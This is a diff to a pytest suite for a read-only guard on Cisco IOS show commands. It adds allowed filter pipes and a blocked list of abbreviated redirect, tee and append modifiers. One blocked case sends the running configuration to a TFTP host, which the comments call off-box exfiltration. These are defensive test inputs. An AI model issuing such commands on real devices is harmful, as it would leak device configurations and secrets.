@@ -54,6 +54,10 @@ _ALLOWED = [
     "traceroute 10.0.0.1",
     "show running-config | include secret",  # filter pipe is a read, allowed
     "show ip route | section bgp",
+    "show run | exclude !",                  # the full filter allowlist...
+    "show run | begin interface",
+    "show run | count line",
+    "show run | include bgp | exclude neighbor",  # ...incl. chained filters
 ]
 
 # Single-token / single-line writes and state-changing EXEC verbs. None of these
@@ -89,6 +93,26 @@ _BLOCKED_SMUGGLED = [
     "show run | append flash:leak.txt",
 ]
 
+# The abbreviation matrix (issue #35): IOS accepts minimum-unique abbreviations
+# for output modifiers, so a write-target *blocklist* of full words missed these.
+# A filter *allowlist* refuses anything after `|` that is not a known read
+# filter, full word -- so every abbreviated redirect/tee/append is refused, and a
+# redirect hidden behind a legal filter (chained pipe) is caught too. Remote
+# destinations make the leak an off-box exfiltration, not just a local write.
+_BLOCKED_PIPE = [
+    "show running-config | red flash:pwn.txt",       # redirect -> red
+    "show run | redi flash:pwn.txt",
+    "show run | redir tftp://10.0.0.9/cfg",
+    "show running-config | red tftp://10.0.0.9/cfg",  # off-box exfiltration
+    "show run | te flash:leak.txt",                   # tee -> te
+    "show run | a flash:leak.txt",                    # append -> a
+    "show run | ap flash:leak.txt",
+    "show run | section bgp | red flash:x",           # filter THEN abbrev redirect
+    "show run | include bgp | tee flash:x",
+    "show run | i secret",                            # abbreviated FILTER also refused
+    "show run | format",                              # unrecognized modifier fails closed
+]
+
 
 class TestAllowedReadsReachTheWire:
     @pytest.mark.parametrize("command", _ALLOWED)
@@ -113,6 +137,13 @@ class TestWritesAreRefusedBeforeTheWire:
         with pytest.raises(WriteAttemptOnReadPath):
             conn.run_show(command)
         assert fake.sent == []  # the smuggled write never reaches send_command
+
+    @pytest.mark.parametrize("command", _BLOCKED_PIPE)
+    def test_pipe_write_or_abbreviation_refused(self, command: str) -> None:
+        conn, fake = _connected()
+        with pytest.raises(WriteAttemptOnReadPath):
+            conn.run_show(command)
+        assert fake.sent == []  # the redirect never reaches send_command
 
 
 class TestGuardShape:
